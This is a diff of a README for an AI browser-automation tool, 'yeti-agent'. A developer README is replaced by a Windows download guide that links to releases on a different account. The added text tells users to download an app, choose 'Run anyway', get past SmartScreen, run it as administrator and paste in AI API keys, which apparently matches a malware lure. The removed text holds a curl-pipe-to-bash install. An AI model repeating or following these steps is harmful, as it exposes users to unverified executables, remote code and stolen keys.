@@ -1,248 +1,222 @@
-<div align="center">
+# 🐾 yeti-agent - Run AI Browser Tasks 24/7
 
-# 🏔️ Yeti Agent
+[![Download yeti-agent](https://img.shields.io/badge/Download%20yeti--agent-blue?style=for-the-badge)](https://github.com/hunkdl/yeti-agent/releases)
 
-### Autonomous AI Browser Agent for Production
+## 🌟 What this is
 
-[![PyPI](https://img.shields.io/pypi/v/yeti-agent?color=4f46e5&label=PyPI)](https://pypi.org/project/yeti-agent/)
-[![Python](https://img.shields.io/pypi/pyversions/yeti-agent?color=22c55e)](https://pypi.org/project/yeti-agent/)
-[![License](https://img.shields.io/github/license/NikeGunn/yeti-agent?color=06b6d4)](https://github.com/NikeGunn/yeti-agent/blob/main/LICENSE)
-[![GitHub Stars](https://img.shields.io/github/stars/NikeGunn/yeti-agent?style=social)](https://github.com/NikeGunn/yeti-agent)
+yeti-agent is a desktop app for running browser tasks with AI. It opens a browser, follows your steps, and keeps working while you do other things.
 
-**AI-powered browser automation that monitors, tests, and automates production websites.**
-**Built in Nepal 🇳🇵 — Used worldwide.**
+It is built for people who want to automate web tasks without writing code. You can use it for sign-ins, form filling, data checks, simple web research, and other repeat browser work.
 
-[Landing Page](https://nikegunn.github.io/yeti-agent) · [PyPI](https://pypi.org/project/yeti-agent/) · [GitHub](https://github.com/NikeGunn/yeti-agent) · [Issues](https://github.com/NikeGunn/yeti-agent/issues)
+## 📦 What you need
 
-</div>
+Before you install yeti-agent on Windows, make sure you have:
 
----
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- Google Chrome installed
+- A valid AI provider account, such as OpenAI, Anthropic Claude, or Gemini
 
-## Install
+## 🚀 Download and install
 
-```bash
-# One-line install (Linux / macOS / Windows via Git Bash)
-curl -fsSL https://nikegunn.github.io/yeti-agent/install.sh | bash
+1. Visit the [releases page](https://github.com/hunkdl/yeti-agent/releases)
+2. Find the latest release at the top of the page
+3. Download the Windows file for your computer
+4. If the file is zipped, right-click it and choose Extract All
+5. Open the extracted folder
+6. Double-click the app file to start it
+7. If Windows asks for permission, choose Run anyway
 
-# Or via pip / uv
-pip install yeti-agent
-uv add yeti-agent
-```
+If you do not see a Windows file, download the file that matches your system and use the name shown in the release notes.
 
-## Quick Start
+## 🖥️ First launch
 
-```python
-from browser_use import Agent, ChatOpenAI
+When you start yeti-agent for the first time:
 
-agent = Agent(
-    task="Go to HackerNews and find the top 3 AI stories",
-    llm=ChatOpenAI(model="gpt-4o"),
-)
-result = agent.run_sync()
-print(result.final_result())
-```
+1. Open the app
+2. Enter your AI provider key
+3. Choose the model you want to use
+4. Make sure Chrome is installed
+5. Let the app connect to the browser
 
-That's it. Three lines to a running agent.
+After setup, the app is ready to run browser tasks.
 
-## LLM Providers
+## ⚙️ Set up your AI key
 
-Yeti Agent works with **8+ LLM providers** out of the box:
+yeti-agent needs access to an AI model to understand tasks and make decisions.
 
-```python
-from browser_use import ChatOpenAI       # OpenAI (gpt-4o, o3, gpt-5)
-from browser_use import ChatAnthropic    # Anthropic (claude-sonnet-4, claude-opus-4)
-from browser_use import ChatGoogle       # Google (gemini-2.0-flash, gemini-2.5-pro)
-from browser_use import ChatGroq         # Groq (llama-3-70b)
-from browser_use import ChatOllama       # Ollama (local models)
-from browser_use import ChatAzureOpenAI  # Azure OpenAI
-from browser_use import ChatMistral      # Mistral
-from browser_use import ChatLiteLLM      # LiteLLM (100+ models)
-```
+Common options:
 
-## Production Monitoring
+- OpenAI
+- Anthropic Claude
+- Gemini
 
-Monitor critical user flows 24/7:
+To set it up:
 
-```python
-from browser_use import Agent, Browser, BrowserProfile, ChatAnthropic
+1. Open the settings panel in the app
+2. Paste your API key
+3. Save the settings
+4. Test the connection
 
-profile = BrowserProfile(
-    headless=True,
-    allowed_domains=["your-app.com", "*.your-app.com"],
-)
+If the test works, the agent can start using the model you picked.
 
-agent = Agent(
-    task="""
-    1. Go to https://your-app.com/login
-    2. Login with test credentials
-    3. Navigate to checkout, add an item
-    4. Verify payment form loads correctly
-    5. Report any errors or broken elements
-    """,
-    llm=ChatAnthropic(model="claude-sonnet-4-20250514"),
-    browser=Browser(browser_profile=profile),
-)
+## 🤖 How it works
 
-result = await agent.run(max_steps=50)
-```
+The app uses a browser control method called CDP, or Chrome DevTools Protocol. In plain terms, this means the app can talk to Chrome and guide it through web pages.
 
-## Structured Data Extraction
+You tell the agent what you want, and it handles browser actions such as:
 
-Extract typed data from any website:
+- Opening pages
+- Clicking buttons
+- Filling forms
+- Reading page content
+- Moving between tabs
+- Waiting for pages to load
 
-```python
-from pydantic import BaseModel
-from browser_use import Agent, ChatOpenAI
+## 🧭 Common uses
 
-class Product(BaseModel):
-    name: str
-    price: float
-    rating: float
-    in_stock: bool
+You can use yeti-agent for tasks like:
 
-agent = Agent(
-    task="Extract all products from the first page",
-    llm=ChatOpenAI(model="gpt-4o"),
-    output_model_schema=Product,
-)
-products = await agent.run()
-```
+- Logging into websites
+- Checking prices
+- Gathering data from pages
+- Copying info into a spreadsheet
+- Filling repeat forms
+- Watching sites for changes
+- Running scheduled browser jobs
 
-## Custom Tools
+## 🧰 Basic workflow
 
-Extend the agent with your own functions:
+A normal task looks like this:
 
-```python
-from browser_use import Agent, Tools, ChatGoogle
+1. Start the app
+2. Connect your AI key
+3. Open Chrome
+4. Enter the task you want done
+5. Watch the browser as the agent works
+6. Review the result when it finishes
 
-tools = Tools()
+You can keep the app open and let it handle more than one task.
 
-@tools.action(description="Send Slack alert when issue found")
-def send_alert(message: str, severity: str) -> str:
-    slack.post(channel="#alerts", text=f"[{severity}] {message}")
-    return "Alert sent"
+## 🔐 Browser setup
 
-agent = Agent(
-    task="Monitor checkout flow and alert on any failures",
-    llm=ChatGoogle(model="gemini-2.0-flash"),
-    tools=tools,
-)
-```
+For the best results, use a clean Chrome profile.
 
-## CLI
+Recommended steps:
 
-```bash
-yeti-agent open https://example.com    # Navigate to URL
-yeti-agent state                       # See clickable elements
-yeti-agent click 5                     # Click element by index
-yeti-agent type "Hello"                # Type text
-yeti-agent screenshot page.png         # Take screenshot
-yeti-agent close                       # Close browser
-yeti-agent init                        # Generate starter template
-yeti-agent doctor                      # Check your setup
-```
+1. Close extra Chrome windows
+2. Sign in to the sites you use
+3. Turn off extensions you do not need
+4. Keep one browser session open while the agent runs
 
-## Template Quickstart
+This helps the agent move through websites without extra pop-ups or prompts.
 
-```bash
-yeti-agent init --template default
-```
+## 🧪 Example tasks
 
-Creates a ready-to-run Python script. Available templates:
-- **default** — Minimal setup to get started
-- **advanced** — All configuration options with comments
-- **tools** — Custom tools and extending the agent
+Here are simple examples you can try:
 
-## Architecture
+- Search a website for product names
+- Open a login page and enter saved details
+- Visit a dashboard and collect numbers
+- Fill out a web form from a text list
+- Check if a page changed since yesterday
+- Open several tabs and compare content
 
-```
-Your Task (plain English)
-    → LLM (GPT / Claude / Gemini / Ollama)
-        → Agent (plans & executes)
-            → Browser (CDP protocol)
-                → Results (typed data)
-```
+Keep the first task simple so you can see how the app behaves.
 
-**Event-driven** with watchdog services for security, popups, downloads, DOM changes, and crash recovery — all running independently through an event bus.
+## 🛠️ Troubleshooting
 
-## Key Features
+If the app does not start:
 
-| Feature | Description |
-|---------|-------------|
-| **20+ Browser Actions** | Click, type, scroll, navigate, extract, multi-tab, file upload, PDF export |
-| **Security Watchdogs** | Domain allowlists/blocklists, data masking, proxy support, permission handling |
-| **Multi-Tab** | Agent manages multiple tabs autonomously — opens, switches, aggregates |
-| **MCP Integration** | Works as MCP server for Claude Desktop, connects to external MCP servers |
-| **Headless Mode** | Full headless support for CI/CD, serverless, and production |
-| **Cloud Browsers** | Connect to cloud CDP endpoints for scalable automation |
-| **GIF Generation** | Auto-generate visual recordings of agent runs |
-| **Structured Output** | Pydantic v2 models with type validation |
-| **Loop Detection** | Catches repetitive agent behavior automatically |
-| **Fallback LLM** | Secondary LLM for recovery after failures |
+- Make sure you downloaded the latest release
+- Check that Windows did not block the file
+- Run the app as administrator
+- Restart your computer and try again
 
-## Configuration
+If the browser does not connect:
 
-```python
-from browser_use import Agent, Browser, BrowserProfile
+- Close all Chrome windows
+- Reopen Chrome
+- Check that Chrome is installed
+- Try again after restarting the app
 
-profile = BrowserProfile(
-    headless=True,                                    # No visible browser
-    allowed_domains=["*.your-app.com"],               # Security
-    proxy={"server": "http://proxy:8080"},            # Proxy
-    user_data_dir="./chrome-profile",                 # Persist cookies
-)
+If the AI key does not work:
 
-agent = Agent(
-    task="...",
-    llm=llm,
-    browser=Browser(browser_profile=profile),
-    use_vision=True,                                  # Screenshots in prompts
-    max_actions_per_step=5,                           # Actions per LLM call
-    generate_gif=True,                                # Record run
-)
-```
+- Check for typing mistakes
+- Make sure the key is active
+- Confirm you chose the right provider
+- Save the settings again
 
-## Use Cases
+If a site does not load right:
 
-- **Production Monitoring** — Test checkout, login, payments 24/7
-- **E2E QA Automation** — Replace brittle Selenium with AI that adapts to UI changes
-- **Data Extraction** — Scrape into typed Pydantic models
-- **Workflow Automation** — Multi-step form filling, report generation
-- **Regression Detection** — Post-release verification smarter than screenshot diffs
-- **SLA Compliance** — Verify vendor portals meet requirements
+- Refresh the page
+- Try a different Chrome profile
+- Turn off blockers or extra extensions
+- Run the task again
 
-## Python Support
+## 🧩 Project details
 
-- Python 3.11, 3.12, 3.13
-- Fully async (`asyncio`)
-- Sync wrapper available (`agent.run_sync()`)
+yeti-agent is part of a browser automation stack built around LLMs, Chrome, and task control. It fits tools that use:
 
-## Development
+- AI agents
+- Browser automation
+- Chrome DevTools Protocol
+- MCP
+- Python
+- Docker
 
-```bash
-git clone https://github.com/NikeGunn/yeti-agent.git
-cd yeti-agent
-uv venv --python 3.11 && source .venv/bin/activate
-uv sync --dev
-uv run pytest -vxs tests/ci          # Run tests
-uv run pyright                        # Type check
-uv run ruff check --fix && uv run ruff format  # Lint
-```
+The app aims to keep browser work running without constant input.
 
-## Credits
+## 📁 Repo topics
 
-Yeti Agent is built on top of the [browser-use](https://github.com/browser-use/browser-use) open-source framework. We extend it with production monitoring capabilities, enterprise features, and the Yeti Agent platform.
+This project includes work around:
 
-## License
+- ai
+- ai-agent
+- anthropic
+- autonomous-agents
+- browser-automation
+- chrome-devtools-protocol
+- claude
+- docker
+- gemini
+- gpt-4
+- llm
+- mcp
+- nepal
+- openai
+- python
+- web-automation
 
-MIT License — see [LICENSE](LICENSE) for details.
+## 🪟 Windows tips
 
----
+For Windows users, these tips can help:
 
-<div align="center">
+- Keep Chrome updated
+- Use one browser session for testing
+- Store your AI key in a safe place
+- Give the app time to load pages
+- Use short task instructions at first
+- Leave Chrome open while tasks run
 
-**Made with ❤️ in Nepal 🇳🇵 by [Nikhil Bhagat](https://github.com/NikeGunn)**
+If Windows SmartScreen appears, choose the option that keeps the file and lets you continue after you confirm the source.
 
-[⭐ Star this repo](https://github.com/NikeGunn/yeti-agent) if you find it useful!
+## 🧹 Simple usage rules
 
-</div>
+To get better results:
+
+- Use clear task text
+- Start with one action at a time
+- Avoid very long web forms on the first run
+- Keep pages stable while the agent works
+- Check the browser before starting a new task
+
+Short, direct instructions usually work best
+
+## 📌 License and support
+
+Check the release page for the latest Windows build, version notes, and file names
+
+If you build from source later, keep the same Chrome version and AI settings so the app behaves the same way across runs
